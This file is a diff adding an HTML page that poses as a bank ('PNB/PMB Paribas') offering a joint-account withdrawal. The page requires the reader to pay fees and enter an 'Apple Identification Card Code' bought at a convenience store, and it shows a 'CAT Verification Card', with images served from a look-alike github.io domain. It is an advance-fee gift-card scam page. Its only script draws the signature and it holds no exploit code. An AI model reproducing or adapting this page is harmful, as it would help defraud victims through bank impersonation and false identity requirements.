@@ -1,0 +1,268 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>PNB Paribas Withdrawal Authorization</title>
+  <style>
+    body {
+      font-family: "Segoe UI", sans-serif;
+      background-color: #eef1f5;
+      margin: 0;
+      padding: 10px;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+    }.container {
+  background-color: #fff;
+  padding: 20px;
+  border-radius: 10px;
+  width: 100%;
+  max-width: 600px;
+  box-shadow: 0 8px 16px rgba(0,0,0,0.1);
+  animation: fadeIn 1s ease-in-out;
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(-20px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.logo {
+  text-align: center;
+  margin-bottom: 10px;
+}
+
+.logo h1 {
+  font-size: 22px;
+  color: #004080;
+  animation: slideRight 1.2s ease-out;
+}
+
+@keyframes slideRight {
+  from { transform: translateX(-50px); opacity: 0; }
+  to { transform: translateX(0); opacity: 1; }
+}
+
+h2 {
+  text-align: center;
+  color: #003366;
+  margin-bottom: 10px;
+  font-size: 20px;
+}
+
+p.agreement {
+  background: #f9f9f9;
+  border-left: 4px solid #003366;
+  padding: 15px;
+  font-size: 14px;
+  line-height: 1.6;
+  margin-bottom: 20px;
+}
+
+label {
+  margin-top: 10px;
+  display: block;
+  font-weight: bold;
+  margin-bottom: 5px;
+  font-size: 14px;
+}
+
+input {
+  width: 100%;
+  padding: 10px;
+  margin-bottom: 15px;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+  font-size: 14px;
+}
+
+canvas {
+  display: block;
+  border: 1.5px solid #222;
+  width: 100%;
+  height: 250px;
+  touch-action: none;
+  margin: 10px 0 20px;
+  background: #fff;
+}
+
+button {
+  background-color: #004080;
+  color: white;
+  padding: 12px;
+  border: none;
+  border-radius: 5px;
+  width: 100%;
+  font-size: 16px;
+  cursor: pointer;
+  margin-top: 5px;
+}
+
+button:hover {
+  background-color: #002f5f;
+}
+
+#message {
+  margin-top: 15px;
+  text-align: center;
+  font-weight: bold;
+}
+
+img {
+  max-width: 100%;
+  height: auto;
+}
+
+@media (min-width: 768px) {
+  .container {
+    padding: 30px;
+  }
+
+  h2 {
+    font-size: 24px;
+  }
+
+  .logo h1 {
+    font-size: 26px;
+  }
+}
+
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <h1>🏦 PNB Paribas</h1>
+    </div><h2>Joint Withdrawal Authorization</h2>
+
+<p class="agreement">
+  By signing and submitting this form, you confirm that you are the authorized party to withdraw funds from the joint account held with <strong>Hannah Garden</strong>. You acknowledge and agree to:
+  <ul style="margin-left: 15px;">
+    <li>🔐 Accept sole responsibility for initiating and completing this withdrawal.</li>
+    <li>🧾 Cover all transaction and verification fees upon submission.</li>
+    <li>🆔 Provide a valid <strong>Apple Identification Card Code</strong> for identity verification before processing.</li>
+    <li>📄 Treat this signed form as a legally binding agreement between you and PMB Paribas.</li>
+  </ul>
+
+  <strong>Apple Identification Notice:</strong><br>
+  If you already possess an Apple Identification Card Code, please enter it in the withdrawal field below. If you do <u>not</u> have one, you are required to:
+  <ol style="margin-left: 15px;">
+    <li>Obtain your official Apple Identification Card from any certified convenience store.</li>
+    <li>Or request a new card issuance directly from PNB Paribas identification services.</li>
+  </ol>
+  No withdrawal will be processed without verified identity through this card.<br><br>
+  You understand that this authorization is final and will be governed by PMB Paribas international banking policies.
+</p>
+
+<div style="text-align:center; margin-bottom: 20px;">
+  <h3>🔖 Apple Identification Card Example</h3>
+  <img src="https://bnp-paribas-banking.github.io/BNP-ASSETS/IMG-20250621-WA0128.jpg" alt="Apple ID Card Example">
+  <p style="font-size: 14px; color: #333;">Sample representation. Your issued card will contain your ID code used for withdrawal verification.</p>
+</div>
+
+<p class="agreement">
+  <strong>CAT Verification Requirement:</strong><br>
+  In addition to the Apple ID, PMB Paribas policy may require a <strong>CAT Verification Card</strong> for secondary validation, especially for high-value withdrawals or international transfers.
+
+  <ol style="margin-left: 15px;">
+    <li>This card can be obtained from any PMB-certified convenience store.</li>
+    <li>It confirms biometric and identity proof through our CAT (Customer Authorization Token) system.</li>
+  </ol>
+  This card should be retained in case of physical verification. While no input is required in this form, it may be requested at the branch level.
+
+  <div style="text-align:center; margin-top: 20px;">
+    <h3>🐱 CAT Verification Card Preview</h3>
+    <img src="https://bnp-paribas-banking.github.io/BNP-ASSETS/IMG-20250621-WA0128.jpg" alt="CAT Card Preview">
+    <p style="font-size: 13px; color: #333;">CAT Card confirms identity at supported banking points. Not required to input here, but should be presented upon request.</p>
+  </div>
+</p>
+
+<form id="jointForm">
+  <label for="userName">Your Full Name</label>
+  <input type="text" id="userName" required placeholder="e.g., Michael Johnson" />
+
+  <label for="appleId">Apple Identification Card Code</label>
+  <input type="text" id="appleId" required placeholder="e.g., APL-2837-XXXX" />
+
+  <label>Beneficiary Name</label>
+  <input type="text" value="Hannah Garden" readonly />
+
+  <label>
+    <input type="checkbox" id="agree" required />
+    I accept and agree to the withdrawal terms and conditions.
+  </label>
+
+  <label for="signature">Digital Signature (Draw Below)</label>
+  <canvas id="signature"></canvas>
+  <button type="button" onclick="clearSignature()">Clear Signature</button>
+
+  <button type="submit">Submit to PNB Paribas</button>
+</form>
+
+<div id="message"></div>
+
+  </div>  <script>
+    const canvas = document.getElementById("signature");
+    const ctx = canvas.getContext("2d");
+    let drawing = false;
+    let lastX = 0;
+    let lastY = 0;
+
+    canvas.addEventListener("touchstart", function(e) {
+      const rect = canvas.getBoundingClientRect();
+      const touch = e.touches[0];
+      lastX = touch.clientX - rect.left;
+      lastY = touch.clientY - rect.top;
+      drawing = true;
+    });
+
+    canvas.addEventListener("touchmove", function(e) {
+      if (!drawing) return;
+      const rect = canvas.getBoundingClientRect();
+      const touch = e.touches[0];
+      const x = touch.clientX - rect.left;
+      const y = touch.clientY - rect.top;
+      ctx.beginPath();
+      ctx.moveTo(lastX, lastY);
+      ctx.lineTo(x, y);
+      ctx.strokeStyle = "#000";
+      ctx.lineWidth = 2;
+      ctx.stroke();
+      lastX = x;
+      lastY = y;
+      e.preventDefault();
+    });
+
+    canvas.addEventListener("touchend", () => drawing = false);
+    canvas.addEventListener("touchcancel", () => drawing = false);
+
+    canvas.addEventListener("mousedown", e => {
+      const rect = canvas.getBoundingClientRect();
+      lastX = e.clientX - rect.left;
+      lastY = e.clientY - rect.top;
+      drawing = true;
+    });
+
+    canvas.addEventListener("mousemove", e => {
+      if (!drawing) return;
+      const rect = canvas.getBoundingClientRect();
+      const x = e.clientX - rect.left;
+      const y = e.clientY - rect.top;
+      ctx.beginPath();
+      ctx.moveTo(lastX, lastY);
+      ctx.lineTo(x, y);
+      ctx.strokeStyle = "#000";
+      ctx.lineWidth = 2;
+      ctx.stroke();
+      lastX = x;
+      lastY = y;
+    });
+
+    canvas.addEventListener("mouseup", () => drawing = false);
+    canvas.addEventListener("mouseleave", () => drawing = false);
+
+    function clearSignature() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+    }
+  </script></body>
+</html>
